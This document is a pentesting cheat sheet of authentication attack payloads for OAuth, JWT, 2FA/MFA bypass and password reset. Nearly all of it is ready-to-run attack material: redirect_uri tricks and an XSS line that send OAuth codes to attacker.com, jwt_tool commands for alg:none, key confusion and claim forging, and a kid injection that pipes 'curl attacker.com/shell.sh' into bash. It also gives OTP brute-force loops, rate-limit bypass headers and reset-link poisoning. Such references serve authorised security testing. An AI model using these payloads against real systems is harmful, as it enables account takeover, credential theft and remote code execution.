# Auth Payloads

Quick reference for OAuth, JWT, 2FA bypasses.

---

## OAuth

### redirect_uri Manipulation

```
# Basic
?redirect_uri=https://attacker.com

# Path traversal
?redirect_uri=https://legit.com/callback/../../../attacker
?redirect_uri=https://legit.com/callback/..%2f..%2fattacker

# Subdomain confusion
?redirect_uri=https://attacker.legit.com
?redirect_uri=https://legit.com.attacker.com

# Parser confusion
?redirect_uri=https://legit.com@attacker.com
?redirect_uri=https://attacker.com#legit.com
?redirect_uri=https://legit.com%00.attacker.com

# Homograph
?redirect_uri=https://lеgit.com  (Cyrillic е)

# Open redirect chain
?redirect_uri=https://legit.com/redirect?url=https://attacker.com
```

### State Parameter Attacks

```http
# Missing state → CSRF
# Victim clicks attacker's OAuth link with captured code

# Static/predictable state
state=12345
state=base64(user_id)
```

### Response Mode Manipulation

```
response_mode=query      # ?code=xxx
response_mode=fragment   # #code=xxx
response_mode=form_post  # POST body
response_mode=web_message # postMessage (steal via XSS)
```

### Token Theft

```javascript
// XSS on callback domain
new Image().src = 'https://attacker.com/?code=' + location.search;

// Referer leakage (external resources on callback page)
<img src="https://attacker.com/track.gif">
```

### Client Secret Exposure

```bash
# Search mobile apps
strings app.apk | grep -i "client_secret"

# JavaScript bundles
grep -r "client_secret" *.js
```

---

## JWT

### Quick Commands

```bash
# Quick decode (no tools)
echo "eyJhbG..." | cut -d. -f2 | base64 -d | jq

# Signature stripping test
jwt_tool <token> -X s

# Token with trailing dot (truncated sig)
# header.payload.
```

### Signature Tests

```bash
# Test all attacks
python3 jwt_tool.py -M at -t "https://target.com/api" \
  -rh "Authorization: Bearer eyJhbG..."

# Decode
python3 jwt_tool.py <JWT>
```

### None Algorithm

```bash
python3 jwt_tool.py <JWT> -X a

# Manual: Change alg to "none", remove signature
# Result: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### Algorithm Confusion (RS256 → HS256)

```bash
# Get public key
openssl s_client -connect target.com:443 | sed -n '/-----BEGIN/,/-----END/p' > pub.pem

# Sign with public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk pub.pem
```

### Weak Secret Brute Force

```bash
# jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Once cracked
python3 jwt_tool.py <JWT> -S hs256 -p "secret" -pc user -pv admin
```

### JWK Header Injection

```bash
python3 jwt_tool.py <JWT> -X i
```

### JKU/X5U Header Injection

```bash
# Host malicious JWKS
python3 jwt_tool.py -V -js JWKS

# Point jku to attacker server
python3 jwt_tool.py <JWT> -X s -ju https://attacker.com/jwks.json
```

### kid Parameter Injection

```bash
# Path traversal (sign with known file content)
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# SQLi
{"kid": "key1' UNION SELECT 'attacker_secret' --"}

# Command injection
{"kid": "/dev/null; curl attacker.com/shell.sh | bash"}

# Template injection
{"alg": "HS256", "kid": "{{config.SECRET_KEY}}"}

# JWK header embedding (self-signed)
{"alg": "RS256", "jwk": {"kty": "RSA", "n": "attacker_key_n", "e": "AQAB"}}
```

### Claim Manipulation

```bash
# Change role
python3 jwt_tool.py <JWT> -I -pc role -pv admin

# Change user ID  
python3 jwt_tool.py <JWT> -I -pc sub -pv victim_id

# Extend expiration
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999
```

---

## 2FA/MFA Bypass

### Direct Endpoint Access

```http
# Skip 2FA page, access protected endpoint directly
GET /dashboard
GET /api/user/profile
GET /account/settings
```

### Response Manipulation

```json
// Original
{"success": false, "error": "Invalid OTP"}

// Modified
{"success": true}

// Or delete fields
"2fa_required": true  → delete
"mfa_required": true  → delete
```

```
HTTP/1.1 401 → HTTP/1.1 200
HTTP/1.1 403 → HTTP/1.1 302
```

### Brute Force

```bash
# 4-digit (10,000 combinations)
for i in $(seq -w 0 9999); do
  curl -X POST https://target.com/verify-otp -d "code=$i"
done

# 6-digit with ffuf
ffuf -u https://target.com/verify -X POST \
  -d '{"code":"FUZZ"}' -w <(seq -w 0 999999) \
  -mc 200 -fr "invalid"
```

### Rate Limit Bypass

```http
# IP rotation
X-Forwarded-For: 1.1.1.1
X-Real-IP: 2.2.2.2

# Resend code resets counter
POST /resend-otp

# Different session per attempt
```

### Blank/Null Codes

```
code=
code=null
code=000000
code=undefined
# Or omit parameter
```

### Multi-Value Submission

```
code=000000&code=123456
code[]=000000&code[]=123456
{"code":["000000","123456"]}
```

### Token Reuse

```
# Previously used codes still work
# Cross-account: your OTP on victim's session
```

### Password Reset Bypass

```
1. Request password reset
2. Complete reset process
3. Login → 2FA not required
```

### OAuth/SSO Bypass

```http
# OAuth flow skips 2FA
GET /oauth/google/callback?code=...
```

### Race Condition

```python
# HTTP/2 single-packet attack
# Turbo Intruder
for i in range(50):
    engine.queue(otp_request, gate='race1')
engine.openGate('race1')
```

### Remember Me Exploitation

```
# Predictable token
Cookie: remember_me=base64(user_id:timestamp)

# IP-based
X-Forwarded-For: <victim_ip>
```

---

## Session/Password Reset

### Token Manipulation

```
# Predictable tokens
base64(email:timestamp)
md5(email)
sequential: 0001, 0002, 0003

# Token reuse
Use expired/old token

# Remove token parameter
/reset?token= (empty)
/reset (no token param)
```

### Email Parameter Pollution

```
email=victim@target.com&email=attacker@evil.com
email=victim@target.com,attacker@evil.com
email=victim@target.com%0acc:attacker@evil.com
```

### Host Header Poisoning

```http
POST /forgot-password
Host: attacker.com

# Reset link goes to attacker domain
```

### Response Manipulation

```json
# Leak token in response
{"status": "ok", "token": "SECRET"}

# Even on error responses
```

---

## Quick Checklist

### OAuth
- [ ] redirect_uri manipulation (path, subdomain, parser)
- [ ] Missing/static state parameter
- [ ] XSS on callback domain
- [ ] Client secret in apps/JS

### JWT
- [ ] Modify payload, test if signature validated
- [ ] alg:none attack
- [ ] RS256 → HS256 confusion
- [ ] Brute force HMAC secret
- [ ] JWK/JKU/kid injection

### 2FA
- [ ] Direct endpoint access (skip 2FA)
- [ ] Response manipulation
- [ ] Brute force + rate limit bypass
- [ ] Blank/null codes
- [ ] Password reset disables 2FA
- [ ] OAuth bypass

---
*Auth chains: see [OAuth to ATO](../chains/oauth-to-ato.md)*
